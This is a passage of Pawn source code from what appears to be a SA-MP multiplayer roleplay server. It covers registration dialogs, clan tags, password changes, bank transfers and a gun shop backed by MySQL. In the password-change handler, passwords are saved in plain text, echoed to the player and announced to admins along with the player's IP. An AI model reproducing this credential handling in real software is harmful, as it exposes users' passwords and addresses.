							SetPlayerName(playerid, PlayerInfo[playerid][pNormalName]);
							PlayerInfo[playerid][pClanTag] = 0;
                            mysql_format(SQL, str111, sizeof(str111), "UPDATE users SET `ClanTag`='0' WHERE `name`='%s'", PlayerInfo[playerid][pNormalName]);
	       				 	mysql_tquery(SQL,str111,"","");
						}
						case 1:
						{
							if(PlayerInfo[playerid][pMember] != 0 || PlayerInfo[playerid][pLeader] != 0) return SCM(playerid, -1, "Nu poti avea acest tag daca te afli intr-o factiune.");
							format(szName, sizeof(szName), "%s%s", ClanInfo[PlayerInfo[playerid][pClan]][cClanTag], PlayerInfo[playerid][pNormalName]);
                            SetPlayerName(playerid, szName);
							PlayerInfo[playerid][pClanTag] = 1;
                            mysql_format(SQL,str222, sizeof(str222), "UPDATE users SET `ClanTag`='1' WHERE `name`='%s'", PlayerInfo[playerid][pNormalName]);
	       				 	mysql_tquery(SQL,str222,"","");
						}
						case 2:
						{
							format(szName, sizeof(szName), "%s%s", PlayerInfo[playerid][pNormalName], ClanInfo[PlayerInfo[playerid][pClan]][cClanTag]);
                            SetPlayerName(playerid, szName);
							PlayerInfo[playerid][pClanTag] = 2;
                            mysql_format(SQL,str333, sizeof(str333), "UPDATE users SET `ClanTag`='2' WHERE `name`='%s'", PlayerInfo[playerid][pNormalName]);
	       				 	mysql_tquery(SQL,str333,"","");
						}
					}
					format(strings,sizeof(strings),"Your nickname is now: %s",szName);
					SendClientMessage(playerid, COLOR_GENANNOUNCE, strings);
				}
				else
				{
					hidePlayerDialog(playerid);
				}
			}
		}
    if(dialogid == DIALOG_REGISTER)
	{
		if(response)
    	{
		    PlayerInfo[playerid][pLanguage] = 2;
		    SendClientMessage(playerid, COLOR_SERVER, "Zaban Feeli Bazi Shoma Persian Shod");
		    SendClientMessage(playerid, COLOR_SERVER, "[EN] To set the language to English, use /eng.");
		    SendClientMessage(playerid, COLOR_YELLOW, "Choose your character's gender.");
		    ShowPlayerDialog(playerid,DIALOG_REGISTER2,DIALOG_STYLE_LIST,"Choose sex character","Mard\nZan","Entekhab","");
		    RegistrationStep[playerid] = 2;
		    SetPlayerSkin(playerid, 250);
			new str1[512];
			mysql_format(SQL,str1,512,"UPDATE users SET `Language`='2' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
			mysql_tquery(SQL,str1,"","");
		}
		else
		{
		    PlayerInfo[playerid][pLanguage] = 1;
		    SendClientMessage(playerid, COLOR_SERVER, "Language set to english.");
		    SendClientMessage(playerid, COLOR_SERVER, "[FA] Baray Tagheer Zaban Bazi Khod Be Farsi Az Cmd /pr Estefade Konid.");
		    SendClientMessage(playerid, COLOR_YELLOW, "Choose your gender of your character.");
		    ShowPlayerDialog(playerid,DIALOG_REGISTER2,DIALOG_STYLE_LIST,"Choose your gender of your character","Male\nFemale","Choose","");
		    RegistrationStep[playerid] = 2;
		    SetPlayerSkin(playerid, 216);
			new str1[512];
			mysql_format(SQL,str1,512,"UPDATE users SET `Language`='1' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
			mysql_tquery(SQL,str1,"","");
		}
		return 1;
	}
	if(dialogid == DIALOG_REGISTER2)
	{
	    if(response)
		{
		    if(listitem == 0)
			{
				PlayerInfo[playerid][pSex] = 1;
				new str1[512];
				mysql_format(SQL,str1,512,"UPDATE users SET `Sex`='1',`Model`='250'  WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str1,"","");
				RegistrationStep[playerid] = 3;
				SetPlayerSkin(playerid, 250);
				if(PlayerInfo[playerid][pLanguage] == 2)
				{
					format(string, sizeof(string), "Jensiat Shakhsiat SHoma : Mard.");
					SendClientMessage(playerid, COLOR_YELLOW, string);
					ShowPlayerDialog(playerid, DIALOG_REGISTER3, DIALOG_STYLE_INPUT, "Age", "Sen Khod Ra Vared Konid:", "Ok", "");
				}
				else
				{
				    format(string, sizeof(string), "Good! Gender set to: man.");
					SendClientMessage(playerid, COLOR_YELLOW, string);
					ShowPlayerDialog(playerid, DIALOG_REGISTER3, DIALOG_STYLE_INPUT, "Character age", "Type the age of your character bellow:", "Ok", "");
				}
			}
			if(listitem == 1)
			{
				PlayerInfo[playerid][pSex] = 2;
				new str1[512];
				mysql_format(SQL,str1,512,"UPDATE users SET `Sex`='2',`Model`='216' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str1,"","");
				RegistrationStep[playerid] = 3;
				SetPlayerSkin(playerid, 216);
				if(PlayerInfo[playerid][pLanguage] == 2)
				{
					format(string, sizeof(string), "Jensiat Shakhsiat SHoma : Zan.");
					SendClientMessage(playerid, COLOR_YELLOW, string);
					ShowPlayerDialog(playerid, DIALOG_REGISTER3, DIALOG_STYLE_INPUT, "Age", "Sen Khod Ra Vared Konid:", "Ok", "");
				}
				else
				{
				    format(string, sizeof(string), "Good! Gender set to: female.");
					SendClientMessage(playerid, COLOR_YELLOW, string);
					ShowPlayerDialog(playerid, DIALOG_REGISTER3, DIALOG_STYLE_INPUT, "Character age", "Type the age of your character bellow:", "Ok", "");
				}
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_REGISTER3)
	{
        if(response)
	    {
	        for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
			new tmppass[64];
			mysql_real_escape_string(inputtext, tmppass);
			new age = strval(tmppass);
			if(age > 1 && age < 100 && response)
			{
				PlayerInfo[playerid][pAge] = age;
				new str1[512];
				mysql_format(SQL,str1,512,"UPDATE users SET `Age`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pAge],PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str1,"","");
				RegistrationStep[playerid] = 4;
				if(PlayerInfo[playerid][pLanguage] == 2)
				{
					SendClientMessage(playerid, COLOR_SERVER, "Enter your email address. Unless you want to set your e-mail, you can press ok.");
					SendClientMessage(playerid, COLOR_SERVER, "Email can help you to recover your password, in case a look.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_SERVER, "Type your email. If you don't want to set your email, just click ok.");
					SendClientMessage(playerid, COLOR_SERVER, "The email will help you to recover your password, in case you loose it.");
				}
				ShowPlayerDialog(playerid, DIALOG_REGISTER4, DIALOG_STYLE_INPUT, "Email", "(ex: my_email@yahoo.com)", "Ok", "");
			}
			else
			{
				ShowPlayerDialog(playerid,DIALOG_REGISTER2,DIALOG_STYLE_INPUT,"Your age:","Please enter below the age of your character:","Ok","");
				return 1;
			}
        }
        return 1;
 	}
 	if(dialogid == DIALOG_REGISTER4)
 	{
 	    for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
  		new emailtext[64];
		mysql_real_escape_string(inputtext, emailtext);
		strmid(PlayerInfo[playerid][pEmail], emailtext, 0, strlen(emailtext), 64);
		if(IsMail(inputtext) && response && strlen(inputtext)<30)
 	    {
 	        if(PlayerInfo[playerid][pLanguage] == 2)
 	        {
 	        	format(string, sizeof(string), "Email Entekhab Shod: %s.", PlayerInfo[playerid][pEmail]);
 	        	SendClientMessage(playerid, COLOR_YELLOW, string);
			}
			else
			{
			    format(string, sizeof(string), "Email set to: %s.", PlayerInfo[playerid][pEmail]);
 	        	SendClientMessage(playerid, COLOR_YELLOW, string);
			}
 	    }
 	    else
 	    {
 	        if(PlayerInfo[playerid][pLanguage] == 2)
			{
 	        	SendClientMessage(playerid, COLOR_YELLOW, "Shoma Emaili Entekhab Nakardid");
			}
			else
			{
			    SendClientMessage(playerid, COLOR_YELLOW, "You choosed not to set an email.");
			}
		}
		RegistrationStep[playerid] = 0;
		TutTime[playerid] = 1;
		TogglePlayerSpectating(playerid, 1);
		new connectplayer[60],stringplayer[100];
 		GetPlayerName(playerid,connectplayer,sizeof(connectplayer));
		format(stringplayer,sizeof(stringplayer),"New account: %s (%d).",connectplayer,playerid);
 		HLChat(COLOR_RED2,stringplayer);
  		ABroadCast(COLOR_RED2,stringplayer,1);
		foreach(Player,iss)
		{
			if(PlayerInfo[iss][pHelper] > 0 || PlayerInfo[iss][pAdmin] > 0)
			{
				KillTimer(deathdeletetime[iss]);
			}
		}
		return 1;
 	}
 	if(dialogid == DIALOG_HOURGIFT)
	{
		if(response)
		{
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 43;
			SetPlayerCheckpoint(playerid,1785.4000000,-1361.3000000,14.8000000,3.0);
			SCM(playerid, 0xE6E6E6E6, "GPS: {FFFFFF}A checkpoint was set up on the map!");
		}
	}
	if(dialogid == DIALOG_NEWPASS)
	{
		if(response)
    	{
    	    for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
	 		new length = strlen(inputtext);
			if(length == 0 || length > 15)
			{
				SendClientMessage(playerid, COLOR_SERVER, "Please enter another password (maximum 15 characters).");
				ShowPlayerDialog(playerid, DIALOG_NEWPASS,DIALOG_STYLE_INPUT, "Change password:","Type in box your new password:","Done","Close");
				return 1;
			}
	        if(strlen(inputtext) > 1 && strlen(inputtext) < 16)
			{
				new tmppass[64],namee[30],playerip[16];
				mysql_real_escape_string(inputtext, tmppass);
				strmid(PlayerInfo[playerid][pKey], tmppass, 0, strlen(tmppass), 255);
				format(string,sizeof(string),"Your new password is %s.",tmppass);
				SendClientMessage(playerid, COLOR_YELLOW,string);
				GetPlayerName(playerid, namee, sizeof(namee));
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(string,sizeof(string),"%s[user:%d] changed his password. IP: %s",namee,PlayerInfo[playerid][pSQLID],playerip);
				ABroadCast(COLOR_YELLOW, string,1);
				GetPlayerName(playerid,sendername,sizeof(sendername));
				new str2[240];
		        mysql_format(SQL, str2, sizeof(str2), "UPDATE users SET `password`='%s' WHERE `name`='%s'",PlayerInfo[playerid][pKey], PlayerInfo[playerid][pNormalName]);
		        mysql_tquery(SQL,str2,"","");
				return 1;
			}
			else
			{
			    ShowPlayerDialog(playerid, DIALOG_NEWPASS,DIALOG_STYLE_INPUT, "Change password:","Type in box your new password:","Done","Close");
				return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_TRANSFER)
	{
		if(response)
    	{
    	    new cashbank;
			new giveplayer[30];
			if(IsAtBank(playerid))
			{
				GetPlayerName(TransferOffer[playerid],giveplayer,sizeof(giveplayer));
				GetPlayerName(playerid,sendername,sizeof(sendername));
  	 			cashbank = floatround(floatmul(TransferMoney[playerid],0.10),floatround_ceil);
				addVV(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], -TransferMoney[playerid]);
				addVV(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], -cashbank);
				addVV(PlayerInfo[TransferOffer[playerid]][pBAccLY], PlayerInfo[TransferOffer[playerid]][pBAcc], TransferMoney[playerid]);
			}
			else if(accestransfer[playerid] > 0)
			{
			    GetPlayerName(TransferOffer[playerid],giveplayer,sizeof(giveplayer));
				GetPlayerName(playerid,sendername,sizeof(sendername));
  	 			cashbank = floatround(floatmul(TransferMoney[playerid],0.25),floatround_ceil);
				addVV(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], -TransferMoney[playerid]);
				addVV(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], -cashbank);
				addVV(PlayerInfo[TransferOffer[playerid]][pBAccLY], PlayerInfo[TransferOffer[playerid]][pBAcc], TransferMoney[playerid]);
			}
			if(GetPlayerVirtualWorld(playerid) == 0)
			{
				BizzInfo[1][bTill] += cashbank;
			}
			else if(GetPlayerVirtualWorld(playerid) == 1)
			{
			    BizzInfo[21][bTill] += cashbank;
			}
			else if(GetPlayerVirtualWorld(playerid) == 2)
			{
			    BizzInfo[27][bTill] += cashbank;
			}
			format(string, sizeof(string), "{52CC52}You have transferd $%s to %s's account. Tax: $%s", FormatNumber(TransferMoney[playerid]), giveplayer,FormatNumber(cashbank));
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			SendClientMessage(playerid, COLOR_SERVER, string);
		    format(string, sizeof(string), "{52CC52}You have recieved $%s to into your account from %s.", FormatNumber(TransferMoney[playerid]), sendername, playerid);
			SendClientMessage(TransferOffer[playerid], COLOR_SERVER, string);
			if(IsAtBank(playerid))
			{
				format(string, sizeof(string), "($) %s has transferd $%s to %s.", sendername, FormatNumber(TransferMoney[playerid]), giveplayer);
			}
			else if(accestransfer[playerid] > 0)
			{
			    format(string, sizeof(string), "Successful transaction ...");
			    PlayerTextDrawSetString(playerid, ATMTD[playerid][10],string);
			    PlayerTextDrawShow(playerid, ATMTD[playerid][10]);
			    format(string, sizeof(string), "(ATM) %s has transferd $%s to %s.", sendername, FormatNumber(TransferMoney[playerid]), giveplayer);
                accestransfer[playerid] = -1;
                SCM(playerid, COLOR_ERROR, "Access to the [/transfer] has been removed.");
			}
			ABroadCast(COLOR_YELLOW,string,1);
			new var100[256],y,m,d,h,mi,s,string2[256],string3[256];
			getdate(y,m,d);
			gettime(h,mi,s);
			format(string2,sizeof(string2),"[%02d-%02d-%d %02d:%02d:%02d] %s[user:%d] transfered $%s to %s[user:%d].",d,m,y,h,mi,s,sendername,PlayerInfo[playerid][pSQLID],FormatNumber(TransferMoney[playerid]),giveplayer,PlayerInfo[TransferOffer[playerid]][pSQLID]);
			mysql_real_escape_string(string2, string3);
			mysql_format(SQL, var100, sizeof(var100), "INSERT INTO playerlogs (`playerid`,`giverid`,`action`,`time`) VALUES ('%d','%d','%s','%02d-%02d-%d %02d:%02d:%02d')", PlayerInfo[TransferOffer[playerid]][pSQLID],PlayerInfo[playerid][pSQLID],string3,d,m,y,h,mi,s);
			mysql_tquery(SQL,var100,"","");
			PlayerPlaySound(TransferOffer[playerid], 1052, 0.0, 0.0, 0.0);
 	 		new str[256];
			Update(playerid, pBank);
			Update(TransferOffer[playerid], pBank);
			if(GetPlayerVirtualWorld(playerid) == 0)
			{
				mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='1'",BizzInfo[1][bTill]);
				mysql_tquery(SQL,str,"","");
			}
			else if(GetPlayerVirtualWorld(playerid) == 1)
			{
			    mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='21'",BizzInfo[21][bTill]);
				mysql_tquery(SQL,str,"","");
			}
			else if(GetPlayerVirtualWorld(playerid) == 2)
			{
			    mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='27'",BizzInfo[27][bTill]);
				mysql_tquery(SQL,str,"","");
			}
			new ip1[42],ip2[42];
    		GetPlayerIp(playerid,ip1,sizeof(ip1));
    		GetPlayerIp(TransferOffer[playerid],ip2,sizeof(ip2));
			TransferOffer[playerid] = 999;
			TransferMoney[playerid] = 0;
		}
		return 1;
	}
	if(dialogid == DIALOG_HQS)
	{
	    if(response)
	    {
			if(listitem == 0)
			{
				SetPlayerCheckpoint(playerid,1554.6610,-1675.6371,16.1953,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
			if(listitem == 1)
			{
				SetPlayerCheckpoint(playerid,157.4413,1903.3003,18.6682,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
			if(listitem == 2)
			{
				SetPlayerCheckpoint(playerid,1081.0226,-345.1430,73.9839,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
			if(listitem == 3)
			{
				SetPlayerCheckpoint(playerid,627.1133,-572.6523,17.8707,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
			if(listitem == 4)
			{
				SetPlayerCheckpoint(playerid,-329.2862,1536.9629,76.6117,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
			if(listitem == 5)
			{
				SetPlayerCheckpoint(playerid,2495.2554,-1689.8365,14.6800,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
			if(listitem == 6)
			{
				SetPlayerCheckpoint(playerid,1455.0133,750.8113,11.0234,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
			if(listitem == 7)
			{
				SetPlayerCheckpoint(playerid,1457.4807,2772.9023,10.8203,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
			if(listitem == 8)
			{
				SetPlayerCheckpoint(playerid,2435.5708,1671.8771,10.8203,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
			if(listitem == 9)
			{
				SetPlayerCheckpoint(playerid,1614.92480, 1816.09631, 10.91310,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
			if(listitem == 10)
			{
				SetPlayerCheckpoint(playerid,725.1876,-1439.7456,13.5318,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
			if(listitem == 11)
			{
				SetPlayerCheckpoint(playerid,1752.9529,-1894.4460,13.5573,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
			if(listitem == 12)
			{
				SetPlayerCheckpoint(playerid,2286.9487,2431.9595,10.8203,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_LIGHTBLUE,"I've set up a checkpoint on the map. Please follow it !.");
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == Dialog_gunshop)
	{
	    if(response)
	    {
	        GetPlayerName(playerid, sendername, sizeof(sendername));
	        new infostring[512];
	        if(listitem == 0)
			{
				if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 0)
				{
					format(infostring, 256, "* %s bought a baseball bat.",sendername);
					ProxDetector(50.0, playerid, infostring, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 1000);
					BizzInfo[2][bTill] += 1000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='2'",BizzInfo[2][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 5, 1);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 1)
				{
			    	format(infostring, 256, "* %s bought a baseball bat.",sendername);
					ProxDetector(30.0, playerid, infostring, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 1000);
					BizzInfo[9][bTill] += 1000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='9'",BizzInfo[9][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 5, 1);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 2)
				{
			    	format(infostring, 256, "* %s bought a baseball bat.",sendername);
					ProxDetector(50.0, playerid, infostring, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 1000);
					BizzInfo[22][bTill] += 1000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='22'",BizzInfo[22][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 5, 1);
				}
			}
			else if(listitem == 1)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 0)
				{
					format(infostring, 256, "* %s bought a SD Pistol.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 2000);
					BizzInfo[2][bTill] += 2000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='2'",BizzInfo[2][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 23, 30);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 1)
				{
			    	format(infostring, 256, "* %s bought a SD Pistol.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 2000);
					BizzInfo[9][bTill] += 2000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='9'",BizzInfo[9][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 23, 30);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 2)
				{
			    	format(infostring, 256, "* %s bought a SD Pistol.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 2000);
					BizzInfo[22][bTill] += 2000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='22'",BizzInfo[22][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 23, 30);
				}
			}
			else if(listitem == 2)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 0)
				{
					format(infostring, 256, "* %s bought a Desert eagle.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 3000);
					BizzInfo[2][bTill] += 3000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='2'",BizzInfo[2][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 24, 50);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 1)
				{
			    	format(infostring, 256, "* %s bought a Desert eagle.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 3000);
					BizzInfo[9][bTill] += 3000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='9'",BizzInfo[9][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 24, 50);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 2)
				{
			    	format(infostring, 256, "* %s bought a Desert eagle.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 3000);
					BizzInfo[22][bTill] += 3000;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='22'",BizzInfo[22][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 24, 50);
				}
			}
			else if(listitem == 3)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 0)
				{
					format(infostring, 256, "* %s bought a Shotgun.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 4200);
					BizzInfo[2][bTill] += 4200;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='2'",BizzInfo[2][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 25, 20);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 1)
				{
			    	format(infostring, 256, "* %s bought a Shotgun.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 4200);
					BizzInfo[9][bTill] += 4200;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='9'",BizzInfo[9][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 25, 20);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 2)
				{
			    	format(infostring, 256, "* %s bought a Shotgun.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 4200);
					BizzInfo[22][bTill] += 4200;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='22'",BizzInfo[22][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 25, 20);
				}
			}
			else if(listitem == 4)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 0)
				{
					format(infostring, 256, "* %s bought a MP5.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 4600);
					BizzInfo[2][bTill] += 4600;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='2'",BizzInfo[2][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 29, 150);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 1)
				{
			    	format(infostring, 256, "* %s bought a MP5.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 4600);
					BizzInfo[9][bTill] += 4600;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='9'",BizzInfo[9][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 29, 150);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 2)
				{
			    	format(infostring, 256, "* %s bought a MP5.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 4600);
					BizzInfo[22][bTill] += 4600;
					Update(playerid,pCashx);
					mysql_format(SQL,string,sizeof(string),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='22'",BizzInfo[22][bTill]);
					mysql_tquery(SQL,string,"","");
					GivePlayerWeaponEx(playerid, 29, 150);
				}
			}
			else if(listitem == 5)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 150.0, 313.7856,-134.1924,1004.0625) && GetPlayerVirtualWorld(playerid) == 0)
				{
					format(infostring, 256, "* %s bought a AK47.",sendername);
					ProxDetector(50.0, playerid, infostring,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GivePlayerCash(playerid, - 7000);
					BizzInfo[2][bTill] += 7000;
					Update(playerid,pCashx);
